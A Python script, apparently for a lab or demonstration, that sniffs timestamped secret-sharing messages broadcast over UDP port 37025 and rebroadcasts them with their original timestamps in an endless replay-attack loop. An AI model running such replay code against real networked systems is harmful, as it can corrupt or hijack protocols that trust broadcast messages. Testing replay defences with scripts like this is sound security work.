import socket
import time
import binascii

class Attacker:
    def __init__(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        self.socket.bind(("", 37025))
        self.captured_shares = []

    def capture_shares(self):
        print("\n[ATTACKER] -------- Capturing shares --------")
        while len(self.captured_shares) < 5:
            data, addr = self.socket.recvfrom(1024)
            share_data = data.decode()
            print(f"[ATTACKER] Captured: {share_data}")
            self.captured_shares.append(share_data)

    def replay_attack(self):
        print("\n[ATTACKER] -------- Launching replay attack --------")
        time.sleep(60)  # Wait for 60 seconds before replaying
        current_time = int(time.time())
        for share in self.captured_shares:
            parts = share.split(',')
            if len(parts) == 4:
                original_timestamp = int(parts[3])
                updated_share = f"{parts[0]}, {parts[1]}, {parts[2]}, {original_timestamp}"  # Keep original timestamp
                print(f"[ATTACKER] Replaying: {updated_share}")
                print(f"[ATTACKER] Original timestamp: {original_timestamp}, Current time: {current_time}")
                print(f"[ATTACKER] Time difference: {current_time - original_timestamp} seconds")
                self.socket.sendto(updated_share.encode(), ("<broadcast>", 37025))
                time.sleep(3)
            else:
                print(f"[ATTACKER] Invalid share data: {share}")

def main():
    attacker = Attacker()
    attacker.capture_shares()
    while True:
        attacker.replay_attack()
        time.sleep(30)  # Wait for 30 seconds before the next replay attack

if __name__ == "__main__":
    main()